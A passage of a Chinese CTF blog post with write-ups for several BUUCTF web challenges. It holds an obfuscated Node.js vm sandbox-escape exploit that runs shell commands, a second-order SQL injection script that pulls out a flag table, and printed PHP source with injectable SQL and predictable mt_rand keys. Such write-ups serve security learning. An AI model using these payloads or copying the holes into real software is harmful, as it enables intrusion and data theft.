

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link href="https://fonts.proxy.ustclug.org/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">

 <link rel="apple-touch-icon" sizes="76x76" href="/img/1avatar.png">
  <link rel="icon" href="/img/1avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="D3n13d">
  <meta name="keywords" content="Web,CTF,渗透测试">
  
    <meta name="description" content="[HFCTF2020]JustEscape run.php 负责运算结果 下面是源码，考虑到这里的话 真的是PHP嘛 123456789&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &amp;#x27;code&amp;#x27; ] !&#x3D; NULL ) &amp;#123;    $code &#x3D; $_GET[&amp;#x27">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF_web_第四页wp分享">
<meta property="og:url" content="https://d3n13d.github.io/2022/02/09/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E9%A1%B5wp%E5%88%86%E4%BA%AB/index.html">
<meta property="og:site_name" content="D3n13d &#39;s blog">
<meta property="og:description" content="[HFCTF2020]JustEscape run.php 负责运算结果 下面是源码，考虑到这里的话 真的是PHP嘛 123456789&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &amp;#x27;code&amp;#x27; ] !&#x3D; NULL ) &amp;#123;    $code &#x3D; $_GET[&amp;#x27">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291537548.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291605024.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291611143.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022045299.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022137899.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022139273.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291909316.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201292119597.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201292131105.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202011004525.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202011030993.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202082354372.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202030836836.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202030958889.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031015093.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031016069.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031050901.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202031416156.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051850090.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051851566.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202051855445.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202052355031.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061021338.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061038161.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061040606.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061101116.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061213039.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061511274.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062033871.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062137315.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062154467.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062155159.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062156416.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062304486.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202071745556.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202071946757.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202072145163.png">
<meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022222440.png">
<meta property="article:published_time" content="2022-02-08T16:13:27.000Z">
<meta property="article:modified_time" content="2022-02-08T16:15:29.946Z">
<meta property="article:author" content="D3n13d">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291537548.png">
  
  
  <title>BUUCTF_web_第四页wp分享 - D3n13d &#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->

  
<link rel="stylesheet" href="/css/test.css">
<link rel="stylesheet" href="/css/code.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"d3n13d.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":2,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":80}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":21256305,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="D3n13d 's blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>D3n13d &#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                时间线
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友人
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/bg/tree.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="BUUCTF_web_第四页wp分享">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      D3n13d
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-02-09 00:13" pubdate>
        2022年2月9日 凌晨
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      55k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      137 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">BUUCTF_web_第四页wp分享</h1>
            
            <div class="markdown-body">
              <h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291537548.png" srcset="/img/loading.gif" lazyload alt="image-20220129153717464"></p>
<p>run.php 负责运算结果 下面是源码，考虑到这里的话 真的是PHP嘛</p>
<figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>在 JS中也有eval语句 同样python也有 先试试js</p>
<p>传入 <code>Error().stack </code>   <code>error.stack</code> 属性是描述代码中实例化 <code>Error</code> 的点的字符串。</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291605024.png" srcset="/img/loading.gif" lazyload alt="image-20220129160554936"></p>
<p>看起来是vm虚拟机相关问题</p>
<p>exp:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">TypeError</span>[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-built_in">Object</span>.preventExtensions(Buffer.from(<span class="hljs-string">``</span>)).a = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">catch</span>(e)&#123;<br>        <span class="hljs-keyword">return</span> e[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="hljs-function">()=&gt;</span>&#123;&#125;).mainModule[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="hljs-string">`cat /flag`</span>).toString();<br>    &#125;<br>&#125;)()<br><br></code></pre></td></tr></table></figure>

<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291611143.png" srcset="/img/loading.gif" lazyload alt="image-20220129160936265"></p>
<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>注册用户登录后回显用户名，大概是二次注入</p>
<p>下面说一个mysql的例子</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022045299.png" srcset="/img/loading.gif" lazyload alt="image-20220202204500141"></p>
<p>可以看到加了 hex()后原本为0的结果回显出来 解码结果为db1</p>
<p>但是这种情况可能会遇到截断</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022137899.png" srcset="/img/loading.gif" lazyload alt="image-20220202213730833"></p>
<p>这时用双hex解决</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022139273.png" srcset="/img/loading.gif" lazyload alt="image-20220202213935217"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> matplotlib.pyplot <span class="hljs-keyword">import</span> hexbin<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>url=<span class="hljs-string">&#x27;http://d1212d0f-bbc4-44f6-9a4b-0c54ec8249a5.node4.buuoj.cn:81/&#x27;</span><br>url1=<span class="hljs-string">&#x27;http://d1212d0f-bbc4-44f6-9a4b-0c54ec8249a5.node4.buuoj.cn:81/login.php&#x27;</span><br>url2=<span class="hljs-string">&#x27;http://d1212d0f-bbc4-44f6-9a4b-0c54ec8249a5.node4.buuoj.cn:81/register.php&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):<br>	payload=<span class="hljs-string">&quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for 10))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>+i*<span class="hljs-number">10</span>)	<br>	<span class="hljs-comment">#print(payload)</span><br>	data_reg =&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;test111111&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&quot;username&quot;</span>:payload, <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;123&quot;</span>&#125;<br>	data_log =&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;test111111&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;123&quot;</span>&#125;<br>	res1=requests.post(url2,data=data_reg)<br>	time.sleep(<span class="hljs-number">1</span>)<br>	res=requests.post(url1,data=data_log)<br>	soup = BeautifulSoup(res.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>) <br>	<span class="hljs-built_in">print</span>(soup.span.text)<br>	<span class="hljs-comment"># flag=int(soup.span.text,16)</span><br>	<span class="hljs-comment"># flag=int(soup.span.text,16)</span><br>	<span class="hljs-comment"># print(str(flag))</span><br><br>	<span class="hljs-comment">#str=str+&#x27;,&#x27;+soup.span.text</span><br>	<span class="hljs-comment">#print(str)</span><br><br></code></pre></td></tr></table></figure>



<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-comment"># import sleep</span><br><br>url = <span class="hljs-string">&quot;http://e7b9349a-1ea8-4917-b77e-af4edcb3e1a0.node4.buuoj.cn:81/index.php &quot;</span><br>s = requests.session()   <span class="hljs-comment">#保持会话</span><br>rr = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)<br><br>r = s.get(url)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>data = &#123;<span class="hljs-string">&quot;answer&quot;</span>:<span class="hljs-built_in">eval</span>(rr.findall(r.text)[<span class="hljs-number">0</span>])&#125;  <span class="hljs-comment">#计算</span><br>r = s.post(url,data=data)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>):<br>	answer = <span class="hljs-built_in">eval</span>(rr.findall(r.text)[<span class="hljs-number">0</span>])<br>	data = &#123; <span class="hljs-string">&quot;answer&quot;</span> : answer &#125;<br>	sleep(<span class="hljs-number">0.5</span>)<br>	r = s.post( url , data=data)<br>	r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>	<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+%d]:&#x27;</span>%(i) + <span class="hljs-built_in">str</span>(answer))<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>



<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201291909316.png" srcset="/img/loading.gif" lazyload alt="image-20220129190931210"></p>
<p>没啥思路去找源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysql_fetch_assoc(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span 